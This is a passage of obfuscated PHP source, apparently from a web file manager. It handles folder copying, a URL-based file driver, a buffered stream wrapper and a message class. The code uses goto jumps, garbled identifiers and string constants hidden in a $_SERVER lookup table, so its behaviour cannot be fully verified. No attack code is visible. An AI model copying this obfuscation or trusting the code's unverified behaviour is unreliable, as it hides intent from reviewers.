$C ŠÂƒ«¯É, $bãÎçêÒâ, $e†Ôºó¤£ò, $dããó²÷è = false) { goto D¥Ì‹‰ ¿Š; b¢‹¨¤  : if ($BÈäØ×¦) { $this->_childrenAllMake($BÈäØ×¦); } Hook::trigger($Aæ›°°¿Ïª[541]); $this->_copyChildTo($AÚ”šƒéÔ, $aò¡©˜ ­, $c—±Ö†Ğ¶Ø, $bãÎçêÒâ, $e±§š“Å¿Æ, $e†Ôºó¤£ò); goto a¡ŠæÉ¸Ÿ; cé°“šàÈÈ: Model($Aæ›°°¿Ïª[506])->addAll($e±§š“Å¿Æ[$Aæ›°°¿Ïª[504]], array(), !0); Model($Aæ›°°¿Ïª[507])->eventCopy($c—±Ö†Ğ¶Ø); $this->saveAll($e±§š“Å¿Æ[$Aæ›°°¿Ïª[505]]); goto eÃáô¯ï¹·; a¡ŠæÉ¸Ÿ: Hook::trigger($Aæ›°°¿Ïª[542]); if ($c—±Ö†Ğ¶Ø) { $this->folderSizeResetChildren($c—±Ö†Ğ¶Ø); } $this->_childrenListClear(); goto cé°“šàÈÈ; c¢ğø³ùÀ: $BÈäØ×¦ = $this->fileNameExist($C ŠÂƒ«¯É, $cÍ†ì½†¦); $c—±Ö†Ğ¶Ø = $this->mkdir($C ŠÂƒ«¯É, $cÍ†ì½†¦, $bãÎçêÒâ); if (!$BÈäØ×¦ || $bãÎçêÒâ == REPEAT_RENAME_FOLDER) { $bãÎçêÒâ = !1; } goto b¢‹¨¤  ; D“¨‘†…Ë¿: $this->updateModifyTime($C ŠÂƒ«¯É); return $c—±Ö†Ğ¶Ø; goto c‡ªëÀã¦˜; D¥Ì‹‰ ¿Š: $Aæ›°°¿Ïª =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e±§š“Å¿Æ = array($Aæ›°°¿Ïª[504] => array(), $Aæ›°°¿Ïª[505] => array(), $Aæ›°°¿Ïª[503] => array(), $Aæ›°°¿Ïª[540] => array()); $cÍ†ì½†¦ = $dããó²÷è ? $dããó²÷è : $AÚ”šƒéÔ->getPathName($AÚ”šƒéÔ->pathThis($aò¡©˜ ­)); goto c¢ğø³ùÀ; eÃáô¯ï¹·: Model($Aæ›°°¿Ïª[422])->linkAdd($e±§š“Å¿Æ[$Aæ›°°¿Ïª[503]]); Model($Aæ›°°¿Ïª[422])->remove($e±§š“Å¿Æ[$Aæ›°°¿Ïª[540]]); $this->folderSizeReset($C ŠÂƒ«¯É); goto D“¨‘†…Ë¿; c‡ªëÀã¦˜: } private function _copyChildTo($B¼ïƒŠÔ, $fê¤Ë‚àîë, $dÄö™±‡İø, $EÀíã“˜Ì, &$E¸ø¶ô¾‚, $cÅ­ˆÌ¼ÀÓ) { goto e…ªÔÆ‰÷±; cßÎ†˜ô¡: foreach ($c“¶ÂÏŒ±Î as &$aëŠˆ«ÒÈÌ) { goto f”½†ø–ÁÒ; BèÉ¤„‹–: if ($EÀíã“˜Ì) { $d‚…Ãù æ¥ = $this->fileNameExistCache($dÄö™±‡İø, $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[28]]); if ($d‚…Ãù æ¥) { if ($aëŠˆ«ÒÈÌ[$fŒìà°¼Í[370]] || $EÀíã“˜Ì == REPEAT_SKIP) { continue; } if ($EÀíã“˜Ì == REPEAT_REPLACE) { $dîŒ²¨óÈ = $this->sourceInfoCache($d‚…Ãù æ¥); $Aá™ ëÆ = $this->fileHistory($dîŒ²¨óÈ, $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[419]], $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[77]]); if ($Aá™ ëÆ) { $E¸ø¶ô¾‚[$fŒìà°¼Í[503]][] = $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[419]]; } continue; } else { if ($EÀíã“˜Ì == REPEAT_RENAME) { $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[28]] = $this->fileNameAutoCache($dÄö™±‡İø, $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[28]], $EÀíã“˜Ì, !1); } } } } if (!$aëŠˆ«ÒÈÌ[$fŒìà°¼Í[370]] && $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[419]]) { $E¸ø¶ô¾‚[$fŒìà°¼Í[503]][] = $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[419]]; } $CÊ®éò½ì¬[] = $this->_makeItemData($aëŠˆ«ÒÈÌ, $bÀ¤„¯éÉ, $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[28]]); goto A™„¶Ã¨‡; f”½†ø–ÁÒ: if (isset($eİÛÌ¯É[$aëŠˆ«ÒÈÌ[$fŒìà°¼Í[28]]])) { $aëŠˆ«ÒÈÌ = $eİÛÌ¯É[$aëŠˆ«ÒÈÌ[$fŒìà°¼Í[28]]]; } $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[370]] = $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[29]] == $fŒìà°¼Í[76]; $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[372]] = _get($aëŠˆ«ÒÈÌ, $fŒìà°¼Í[160], $fŒìà°¼Í[33]); goto aøßñİ·éâ; aøßñİ·éâ: $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[77]] = _get($aëŠˆ«ÒÈÌ, $fŒìà°¼Í[77], 0); $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[419]] = _get($aëŠˆ«ÒÈÌ, $fŒìà°¼Í[419], 0); if (!isset($aëŠˆ«ÒÈÌ[$fŒìà°¼Í[543]]) && $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[419]]) { $E¸ø¶ô¾‚[$fŒìà°¼Í[540]][] = $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[419]]; } goto BèÉ¤„‹–; A™„¶Ã¨‡: } unset($aëŠˆ«ÒÈÌ); if (!empty($CÊ®éò½ì¬)) { $this->addAll($CÊ®éò½ì¬); } goto B•šçäê™¿; e…ªÔÆ‰÷±: $fŒìà°¼Í =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÀ¤„¯éÉ = $this->sourceInfoCache($dÄö™±‡İø); $Aì •°õ = $B¼ïƒŠÔ->listPath($fê¤Ë‚àîë, !1, !0); goto bîÉêÊ¯ÍÉ; bîÉêÊ¯ÍÉ: $c“¶ÂÏŒ±Î = array_merge($Aì •°õ[$fŒìà°¼Í[73]], $Aì •°õ[$fŒìà°¼Í[74]]); $eİÛÌ¯É = $this->_addFiles($B¼ïƒŠÔ, $Aì •°õ[$fŒìà°¼Í[73]], $cÅ­ˆÌ¼ÀÓ); $CÊ®éò½ì¬ = array(); goto cßÎ†˜ô¡; B•šçäê™¿: $F›ÉÓë·Ø = $this->_childrenList($dÄö™±‡İø); $F›ÉÓë·Ø = array_to_keyvalue($F›ÉÓë·Ø, $fŒìà°¼Í[28]); foreach ($c“¶ÂÏŒ±Î as $aëŠˆ«ÒÈÌ) { $dîŒ²¨óÈ = $F›ÉÓë·Ø[$aëŠˆ«ÒÈÌ[$fŒìà°¼Í[28]]]; $C²ù“¢ë± = $dîŒ²¨óÈ[$fŒìà°¼Í[369]]; $this->_copyApplyMeta($dîŒ²¨óÈ, $E¸ø¶ô¾‚); if ($aëŠˆ«ÒÈÌ[$fŒìà°¼Í[29]] == $fŒìà°¼Í[76]) { $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[75]] = $B¼ïƒŠÔ->getPathInner($aëŠˆ«ÒÈÌ[$fŒìà°¼Í[75]]); $this->_copyChildTo($B¼ïƒŠÔ, $aëŠˆ«ÒÈÌ[$fŒìà°¼Í[75]], $C²ù“¢ë±, $EÀíã“˜Ì, $E¸ø¶ô¾‚, $cÅ­ˆÌ¼ÀÓ); } } goto cÁø£§É¶Ä; cÁø£§É¶Ä: } private function _addFiles($c†ÛêÃ·´, $bŞéÄ º‚æ, $dÅ‹…ãš´) { goto cêÂŸ±š; eĞÉ±ˆöá£: return $Bø‡©×òí„; goto AØë±Î‹¢; cŒËÕŠ±ùÛ: $AíîëøÙ× = $C¬Œ¤©îŸà->where($fÌöèÅŠ¸Ì)->select(); $AíîëøÙ× = $AíîëøÙ× ? $AíîëøÙ× : array(); foreach ($AíîëøÙ× as $d¸…§œé) { if (!isset($A“•ùÃ×äç[$d¸…§œé[$FÄ…Õ“±ğ[163]]])) { continue; } $FêÔÀøÉ = $A“•ùÃ×äç[$d¸…§œé[$FÄ…Õ“±ğ[163]]]; foreach ($FêÔÀøÉ as &$C‡Ó¿Ôóç›) { $C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[419]] = $d¸…§œé[$FÄ…Õ“±ğ[419]]; $C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[543]] = !0; } unset($C‡Ó¿Ôóç›); } goto FÇçÕ—£µ¬; fë•ÁÖĞİ°: foreach ($bŞéÄ º‚æ as &$C‡Ó¿Ôóç›) { goto E¾¶Á‚¡Ø; A¨»†Šóß: $C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[163]] = $D³åâøï¨; Hook::trigger($FÄ…Õ“±ğ[545], $C‡Ó¿Ôóç›); $A“•ùÃ×äç[$D³åâøï¨][] =& $C‡Ó¿Ôóç›; goto C¬éÂŠ½çµ; CœÅ·Óá­Ì: $D³åâøï¨ = $c†ÛêÃ·´->hashMd5($C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[75]]); if (strlen($D³åâøï¨) > 10 && !isset($A“•ùÃ×äç[$D³åâøï¨])) { $A“•ùÃ×äç[$D³åâøï¨] = array(); } $C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[164]] = $BÓé»œâø; goto A¨»†Šóß; E¾¶Á‚¡Ø: Hook::trigger($FÄ…Õ“±ğ[544], $C‡Ó¿Ôóç›); $C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[75]] = $c†ÛêÃ·´->getPathInner($C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[75]]); $BÓé»œâø = $c†ÛêÃ·´->hashSimple($C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[75]]); goto CœÅ·Óá­Ì; C¬éÂŠ½çµ: if (count($A“•ùÃ×äç[$D³åâøï¨]) > 1) { $C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[543]] = !0; } goto fèéæ˜Šè; fèéæ˜Šè: } $fÌöèÅŠ¸Ì = array($FÄ…Õ“±ğ[163] => array($FÄ…Õ“±ğ[7], array_keys($A“•ùÃ×äç))); $C¬Œ¤©îŸà = Model($FÄ…Õ“±ğ[546]); goto cŒËÕŠ±ùÛ; FÇçÕ—£µ¬: $AÄ“¼Š™ù¾ = array(); foreach ($bŞéÄ º‚æ as $Dëİåç„Ê) { if (isset($Dëİåç„Ê[$FÄ…Õ“±ğ[543]]) && $Dëİåç„Ê[$FÄ…Õ“±ğ[543]]) { continue; } $aÅ”˜ÚÒĞ = $c†ÛêÃ·´->getPathInner($Dëİåç„Ê[$FÄ…Õ“±ğ[75]]); $DÇ‘ºê„ÎÎ = $C¬Œ¤©îŸà->addFileMake($aÅ”˜ÚÒĞ, $Dëİåç„Ê[$FÄ…Õ“±ğ[77]], $Dëİåç„Ê[$FÄ…Õ“±ğ[164]], $Dëİåç„Ê[$FÄ…Õ“±ğ[163]], $Dëİåç„Ê[$FÄ…Õ“±ğ[28]], $dÅ‹…ãš´); $AÄ“¼Š™ù¾[] = $DÇ‘ºê„ÎÎ; } $C¬Œ¤©îŸà->addAll($AÄ“¼Š™ù¾); goto F‹À¿™Ö¸İ; A´ß—­‡ãÌ: foreach ($AíîëøÙ× as $d¸…§œé) { if (!isset($A“•ùÃ×äç[$d¸…§œé[$FÄ…Õ“±ğ[163]]])) { continue; } $BòÜ®Äˆ”» =& $A“•ùÃ×äç[$d¸…§œé[$FÄ…Õ“±ğ[163]]]; foreach ($BòÜ®Äˆ”» as &$C‡Ó¿Ôóç›) { $C‡Ó¿Ôóç›[$FÄ…Õ“±ğ[419]] = $d¸…§œé[$FÄ…Õ“±ğ[419]]; } unset($C‡Ó¿Ôóç›); } $Bø‡©×òí„ = array(); foreach ($bŞéÄ º‚æ as $eÙ­‹ïÔŠà) { $Bø‡©×òí„[$eÙ­‹ïÔŠà[$FÄ…Õ“±ğ[28]]] = $eÙ­‹ïÔŠà; } goto eĞÉ±ˆöá£; cêÂŸ±š: $FÄ…Õ“±ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$bŞéÄ º‚æ || count($bŞéÄ º‚æ) == 0) { return array(); } $A“•ùÃ×äç = array(); goto fë•ÁÖĞİ°; F‹À¿™Ö¸İ: $fÌöèÅŠ¸Ì = array($FÄ…Õ“±ğ[163] => array($FÄ…Õ“±ğ[7], array_keys($A“•ùÃ×äç))); $AíîëøÙ× = $C¬Œ¤©îŸà->where($fÌöèÅŠ¸Ì)->select(); $AíîëøÙ× = $AíîëøÙ× ? $AíîëøÙ× : array(); goto A´ß—­‡ãÌ; AØë±Î‹¢: } } define($_SERVER[´Ù×Íå‘ÄõÛ][547], $_SERVER[´Ù×Íå‘ÄõÛ][548]); goto B¨èá‡Œğ›; E¿¢Ùïµ¦ƒ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($FÌéÌ÷æÉò = false) { } public function exist($d„§ÁÅßï) { $CÃ« Õ¦§è = $this->info($d„§ÁÅßï); return $CÃ« Õ¦§è[$_SERVER[´Ù×Íå‘ÄõÛ][188]]; } public function isFile($C°‹ˆœå…À) { $e­–²ìçÆ = $this->info($C°‹ˆœå…À); return $e­–²ìçÆ[$_SERVER[´Ù×Íå‘ÄõÛ][188]]; } public function isFolder($CÉôğ÷Êèò) { return !1; } public function size($EÙ‚À¹¹ßŒ) { $C«ï‹œÑÙ = $this->info($EÙ‚À¹¹ßŒ); return $C«ï‹œÑÙ[$_SERVER[´Ù×Íå‘ÄõÛ][77]]; } public function info($fÚœ¶Â‡ºÙ) { return $this->infoParse($fÚœ¶Â‡ºÙ); } public function infoAuth($BŞÙÀØĞ„) { return $this->infoParse($BŞÙÀØĞ„); } public function infoWithChildren($cŸ¹âÉÑå¦) { return $this->infoParse($cŸ¹âÉÑå¦); } public function infoFull($D–Ïô´Œ±ë) { return $this->infoParse($D–Ïô´Œ±ë); } private function infoParse($BĞìÉÎ§) { $B¤İ¤»¾è‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B…Ø’öÅå = $this->header($BĞìÉÎ§); if (!$B…Ø’öÅå || !$B…Ø’öÅå[$B¤İ¤»¾è‘[690]]) { return !1; } $a˜Üµ˜š†Ê = _get($B…Ø’öÅå, $B¤İ¤»¾è‘[325], 0); $e¦³İÀ»Ó = array($B¤İ¤»¾è‘[28] => $B…Ø’öÅå[$B¤İ¤»¾è‘[28]], $B¤İ¤»¾è‘[75] => $BĞìÉÎ§, $B¤İ¤»¾è‘[29] => $B¤İ¤»¾è‘[167], $B¤İ¤»¾è‘[77] => intval($a˜Üµ˜š†Ê), $B¤İ¤»¾è‘[160] => get_path_ext($B…Ø’öÅå[$B¤İ¤»¾è‘[28]]), $B¤İ¤»¾è‘[1166] => $a˜Üµ˜š†Ê > 0 && $B…Ø’öÅå[$B¤İ¤»¾è‘[1294]], $B¤İ¤»¾è‘[1167] => !1); return $e¦³İÀ»Ó; } private function header($cè²ÏôìÂ³) { if (isset(self::$_cacheHeader[$cè²ÏôìÂ³])) { return self::$_cacheHeader[$cè²ÏôìÂ³]; } self::$_cacheHeader[$cè²ÏôìÂ³] = url_header($cè²ÏôìÂ³); return self::$_cacheHeader[$cè²ÏôìÂ³]; } public function hashSimple($D‡Ú‹é‹ÜË, $bÅ´ğ’Šùª = false) { goto f¨¯èáµ ï; eÑ–¹Î˜Ó: $D¶ø…ôòøë = $A»æÌ¬ã‹ô[$C¬Ú½£Ê¾İ[77]]; $D•—îĞƒĞ« = 200; $a§Ã†˜¦Œï = 50; goto A°šää²ªµ; B°óÑ£á: $a“Ï¥Ë‰’Ï .= $this->fileSubstr($D‡Ú‹é‹ÜË, $D¶ø…ôòøë - $D•—îĞƒĞ«, $D•—îĞƒĞ«); return md5($a“Ï¥Ë‰’Ï) . $D¶ø…ôòøë; goto fĞÕÔ‘›õ„; c÷–¤‚×©¿: $C¹¾Å´”Öò = timeFloat(); $a”°›ÄÍÌÛ = 15; for ($aİ¯‰¾—È = 0; $aİ¯‰¾—È < $a§Ã†˜¦Œï; $aİ¯‰¾—È++) { if (timeFloat() - $C¹¾Å´”Öò > $a”°›ÄÍÌÛ) { return !1; } $DŠÈïˆ‹¸ = $this->fileSubstr($D‡Ú‹é‹ÜË, $EâÆÃñŒÂ * $aİ¯‰¾—È, $D•—îĞƒĞ«); if (!$DŠÈïˆ‹¸) { return !1; } $a“Ï¥Ë‰’Ï .= $DŠÈïˆ‹¸; } goto B°óÑ£á; A°šää²ªµ: if ($D¶ø…ôòøë <= $D•—îĞƒĞ« * $a§Ã†˜¦Œï) { return md5($this->fileSubstr($D‡Ú‹é‹ÜË, 0, $D¶ø…ôòøë)) . $D¶ø…ôòøë; } $EâÆÃñŒÂ = intval($D¶ø…ôòøë / $a§Ã†˜¦Œï); $a“Ï¥Ë‰’Ï = $C¬Ú½£Ê¾İ[33]; goto c÷–¤‚×©¿; f¨¯èáµ ï: $C¬Ú½£Ê¾İ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A»æÌ¬ã‹ô = $this->info($D‡Ú‹é‹ÜË); if (!$A»æÌ¬ã‹ô || !$A»æÌ¬ã‹ô[$C¬Ú½£Ê¾İ[188]]) { return !1; } goto eÑ–¹Î˜Ó; fĞÕÔ‘›õ„: } public function getContent($d¶Èîï×Íö) { return $this->fileSubstr($d¶Èîï×Íö); } public function fileSubstr($b»°­ÎÊ¡Ò, $FŸŒ˜Á›Ÿ® = 0, $cò…œÑŸ£· = -1) { goto B¦äåÁõ; fÜğšÛ÷îó: $DëéÒ¹ÍÕò = url_request($b»°­ÎÊ¡Ò, $fï„”ë‡à[216], !1, $fì ›¯×É†, !1, !1, 1); return $DëéÒ¹ÍÕò[$fï„”ë‡à[1038]] ? $DëéÒ¹ÍÕò[$fï„”ë‡à[1038]] : $fï„”ë‡à[33]; goto AÊÉŠ§Šª½; Eù±ÀÆ¹ßÕ: if ($cò…œÑŸ£· === -1) { $cò…œÑŸ£· = $D†Î’Æ‡ÄÙ[$fï„”ë‡à[77]]; } if ($cò…œÑŸ£· == 0) { return $fï„”ë‡à[33]; } $fì ›¯×É† = array($fï„”ë‡à[1295] . $FŸŒ˜Á›Ÿ® . $fï„”ë‡à[716] . ($FŸŒ˜Á›Ÿ® + $cò…œÑŸ£· - 1)); goto fÜğšÛ÷îó; B¦äåÁõ: $fï„”ë‡à =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D†Î’Æ‡ÄÙ = $this->info($b»°­ÎÊ¡Ò); if (!$D†Î’Æ‡ÄÙ || !$D†Î’Æ‡ÄÙ[$fï„”ë‡à[188]] && $D†Î’Æ‡ÄÙ[$fï„”ë‡à[77]] > 1024 * 1024 * 10) { return !1; } goto Eù±ÀÆ¹ßÕ; AÊÉŠ§Šª½: } public function download($DèÇÎÓ¢†, $EÌˆó¹¢±ˆ) { Downloader::start($DèÇÎÓ¢†, $EÌˆó¹¢±ˆ); return $EÌˆó¹¢±ˆ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($d•Ñ¶È­º, $C‰¾‚ñ¨İ = '') { goto BÊ‹Ê„Å¼ê; Cœ–‹¹­ÅÕ: return $this->info ? !0 : !1; goto CŒÁïğª¸; BÊ‹Ê„Å¼ê: $this->info = $this->info($d•Ñ¶È­º); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[´Ù×Íå‘ÄõÛ][75]]; goto Bè”ÜÑö­; Bè”ÜÑö­: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$d•Ñ¶È­º])) { self::$_chunkBuffer[$d•Ñ¶È­º] = array(); } goto Cœ–‹¹­ÅÕ; CŒÁïğª¸: } function stream_read($bšƒîÛÚÊˆ) { $cÅ—ö¬»ã‘ = $this->fileSubstr($this->pose, $bšƒîÛÚÊˆ); $this->pose += strlen($cÅ—ö¬»ã‘); return $cÅ—ö¬»ã‘; } public function stream_tell() { return $this->pose; } public function stream_seek($ašÓáº…‘, $DŠÒëÜÖ‘¸) { $a»¡ß®ç‰º =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($DŠÒëÜÖ‘¸ == SEEK_SET) { $this->pose = $ašÓáº…‘; } else { if ($DŠÒëÜÖ‘¸ == SEEK_CUR) { $this->pose += $ašÓáº…‘; } else { if ($DŠÒëÜÖ‘¸ == SEEK_END) { $this->pose = $this->info[$a»¡ß®ç‰º[77]] + intval($ašÓáº…‘); } } } if ($ašÓáº…‘ < 0) { $this->pose = $this->info[$a»¡ß®ç‰º[77]] + $ašÓáº…‘; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[´Ù×Íå‘ÄõÛ][77]]; } public function stream_close() { return !0; } public function url_stat($fÁâ†ô¤¨ê, $B†¢Û†´) { $B’¬Õé¦‡É =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A»áÅ†ãÁ = $this->info($fÁâ†ô¤¨ê); return array($B’¬Õé¦‡É[1296] => 0, $B’¬Õé¦‡É[1297] => 0, $B’¬Õé¦‡É[12] => 32768 + 511, $B’¬Õé¦‡É[1298] => 0, $B’¬Õé¦‡É[1299] => 0, $B’¬Õé¦‡É[1300] => 0, $B’¬Õé¦‡É[1301] => 0, $B’¬Õé¦‡É[77] => $A»áÅ†ãÁ[$B’¬Õé¦‡É[77]], $B’¬Õé¦‡É[1302] => $A»áÅ†ãÁ[$B’¬Õé¦‡É[1172]], $B’¬Õé¦‡É[1260] => $A»áÅ†ãÁ[$B’¬Õé¦‡É[107]], $B’¬Õé¦‡É[1259] => $A»áÅ†ãÁ[$B’¬Õé¦‡É[187]], $B’¬Õé¦‡É[1303] => 0, $B’¬Õé¦‡É[1304] => 0); } static $fileInfo = array(); public function info($AŒ×ÛƒÔ†) { $fÎø“Šá· = $_SERVER[´Ù×Íå‘ÄõÛ][1305]; if (isset(self::$fileInfo[$AŒ×ÛƒÔ†])) { return self::$fileInfo[$AŒ×ÛƒÔ†]; } if (substr($AŒ×ÛƒÔ†, 0, strlen($fÎø“Šá·)) != $fÎø“Šá·) { return !1; } self::$fileInfo[$AŒ×ÛƒÔ†] = IO::info(substr($AŒ×ÛƒÔ†, strlen($fÎø“Šá·))); return self::$fileInfo[$AŒ×ÛƒÔ†]; } public static function read($FÀ¸¦‚¦Œã, $D¸Œ‘ï¬ç, $DÍÕ’÷Íõ) { goto DƒíÒ’î¹¬; e‹Î“àöË: $e™ÖÒ¨Æô… = 0; while ($e™ÖÒ¨Æô… < $DÍÕ’÷Íõ) { $e‚îİ‰Èß™ = min($b¡İ ¶µ‚ƒ, $DÍÕ’÷Íõ - $e™ÖÒ¨Æô…); $B…Œ¤õ·ƒå .= fread($bßÉ†¶ğÍ, $e‚îİ‰Èß™); $e™ÖÒ¨Æô… += $e‚îİ‰Èß™; } fclose($bßÉ†¶ğÍ); goto C‰›ÀÇÑ‘; Bõõ›®‡: $b¡İ ¶µ‚ƒ = 8192; fseek($bßÉ†¶ğÍ, $D¸Œ‘ï¬ç, SEEK_SET); $B…Œ¤õ·ƒå = $dˆ¡Ò‡‰ƒÏ[33]; goto e‹Î“àöË; DƒíÒ’î¹¬: $dˆ¡Ò‡‰ƒÏ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bßÉ†¶ğÍ = fopen($FÀ¸¦‚¦Œã, $dˆ¡Ò‡‰ƒÏ[1174]); if (!$bßÉ†¶ğÍ) { return $dˆ¡Ò‡‰ƒÏ[33]; } goto Bõõ›®‡; C‰›ÀÇÑ‘: return $B…Œ¤õ·ƒå; goto fÎïù¹³•; fÎïù¹³•: } public function fileSubstr($Bèˆá³Œ¤, $bºª„¦ßÙ) { goto b‹¸Í‚ĞÊ; b‹¸Í‚ĞÊ: $c­Å‚´àÎ¹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c«´‚çÆÙ = $this->info[$c­Å‚´àÎ¹[77]]; $BÄ½İšòÜ = $Bèˆá³Œ¤; goto eæñğ£Ü°‹; e®Éá·”¿Ò: $fø„õÕ´°Š = ceil(($Bèˆá³Œ¤ + $bºª„¦ßÙ) / $cÁ¿ù¦áˆ×) * $cÁ¿ù¦áˆ× - $CÈ×ø§ŞÆ¹; $aíñËğÖÇĞ = IO::fileSubstr($this->path, $CÈ×ø§ŞÆ¹, $fø„õÕ´°Š); $a·¼ŠÖ¢ƒ[$CÈ×ø§ŞÆ¹ . $c­Å‚´àÎ¹[33]] = $aíñËğÖÇĞ; goto dÔÛ²…¾¯; cˆ¦öå˜Ù: $cÁ¿ù¦áˆ× = 64 * 1024; $a·¼ŠÖ¢ƒ =& self::$_chunkBuffer[$this->path]; if (!$a·¼ŠÖ¢ƒ) { $a·¼ŠÖ¢ƒ = array(); } goto F ‰Å„½ÙŠ; e‹Ó ¹ôĞ…: if ($Bèˆá³Œ¤ + $bºª„¦ßÙ > $c«´‚çÆÙ) { $bºª„¦ßÙ = $c«´‚çÆÙ - $Bèˆá³Œ¤; } if ($bºª„¦ßÙ <= 0) { return $c­Å‚´àÎ¹[33]; } if ($Bèˆá³Œ¤ < 0 || $Bèˆá³Œ¤ >= $c«´‚çÆÙ || $bºª„¦ßÙ <= 0 || $bºª„¦ßÙ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\x69\154\145\122\x65\x61\144\40\x65\162\x72\x6f\x72\x21\40\x73\164\x61\x72\164\x3d{$Bèˆá³Œ¤}\73\154\145\x6e\x67\164\150\75{$bºª„¦ßÙ}\73\40\x73\151\172\x65\x3d{$c«´‚çÆÙ}\73"); } goto cˆ¦öå˜Ù; F ‰Å„½ÙŠ: $BÎ÷›™±âŒ = 0; $EŒ„Ùæ›Ó± = 0; $fì‚®”©‘ = $c­Å‚´àÎ¹[33]; goto F¹Ü‘Ô°ÌÃ; dÔÛ²…¾¯: ksort($a·¼ŠÖ¢ƒ); $AÙÜËŞå† = substr($aíñËğÖÇĞ, $Bèˆá³Œ¤ - $CÈ×ø§ŞÆ¹, $bºª„¦ßÙ); return $AÙÜËŞå†; goto BÖ´ô”ŞŒÊ; eæñğ£Ü°‹: $FÂ Ùêß = $bºª„¦ßÙ; if ($Bèˆá³Œ¤ < 0) { $Bèˆá³Œ¤ = $c«´‚çÆÙ + $Bèˆá³Œ¤; } if ($bºª„¦ßÙ === !1) { $bºª„¦ßÙ = $c«´‚çÆÙ - $Bèˆá³Œ¤; } goto e‹Ó ¹ôĞ…; F¹Ü‘Ô°ÌÃ: foreach ($a·¼ŠÖ¢ƒ as $BÎ÷›™±âŒ => $fì‚®”©‘) { $BÎ÷›™±âŒ = intval($BÎ÷›™±âŒ); $EŒ„Ùæ›Ó± = $BÎ÷›™±âŒ + strlen($fì‚®”©‘); if ($Bèˆá³Œ¤ >= $EŒ„Ùæ›Ó±) { continue; } if ($Bèˆá³Œ¤ >= $BÎ÷›™±âŒ && $Bèˆá³Œ¤ + $bºª„¦ßÙ <= $EŒ„Ùæ›Ó±) { return substr($fì‚®”©‘, $Bèˆá³Œ¤ - $BÎ÷›™±âŒ, $bºª„¦ßÙ); } break; } if (count($a·¼ŠÖ¢ƒ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($c­Å‚´àÎ¹[1306], $c­Å‚´àÎ¹[1307] . count($a·¼ŠÖ¢ƒ) . "\73\x73\164\x61\x72\164\x3d{$Bèˆá³Œ¤}\54\x6c\145\156\147\x74\x68\x3d{$bºª„¦ßÙ}\73\x70\x6f\x73\x65\x3a{$BÎ÷›™±âŒ}\x7e{$EŒ„Ùæ›Ó±}"); throw new Exception($c­Å‚´àÎ¹[1308]); } $CÈ×ø§ŞÆ¹ = intval($Bèˆá³Œ¤ / $cÁ¿ù¦áˆ×) * $cÁ¿ù¦áˆ×; goto e®Éá·”¿Ò; BÖ´ô”ŞŒÊ: } private function log($AÃŞ»ÓŠ‰§, $d‰†ƒ—¼›) { $dåİòÁÚò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F•’òºôš = timeFloat() - $this->timeStart; write_log(sprintf($dåİòÁÚò[1309], $AÃŞ»ÓŠ‰§, $this->info[$dåİòÁÚò[28]], $F•’òºôš, $d‰†ƒ—¼›), $dåİòÁÚò[1223]); } } class Message { function __construct() { } public function send($cÔºÄ¢á‹‚ = '', $DÈÂ÷‡„ÛÕ = array(), $b‘ƒ¥ˆåå¡ = "\164\x65\170\x74") { goto Bœ°›…¡; c°ÉÊ•’”ˆ: $DÈÂ÷‡„ÛÕ = array($E¾ÓáÌÃ¸•[974] => isset($DÈÂ÷‡„ÛÕ[$E¾ÓáÌÃ¸•[974]]) ? $DÈÂ÷‡„ÛÕ[$E¾ÓáÌÃ¸•[974]] : $E¾ÓáÌÃ¸•[33], $E¾ÓáÌÃ¸•[537] => isset($DÈÂ÷‡„ÛÕ[$E¾ÓáÌÃ¸•[537]]) ? $DÈÂ÷‡„ÛÕ[$E¾ÓáÌÃ¸•[537]] : $E¾ÓáÌÃ¸•[33]); if (empty($cÔºÄ¢á‹‚) || empty($DÈÂ÷‡„ÛÕ[$E¾ÓáÌÃ¸•[974]]) && empty($DÈÂ÷‡„ÛÕ[$E¾ÓáÌÃ¸•[537]])) { return !1; } $DÛ©—ĞÇ = array($E¾ÓáÌÃ¸•[1252] => $b«ï¨Ñ‚÷œ, $E¾ÓáÌÃ¸•[1312] => $DÈÂ÷‡„ÛÕ); goto 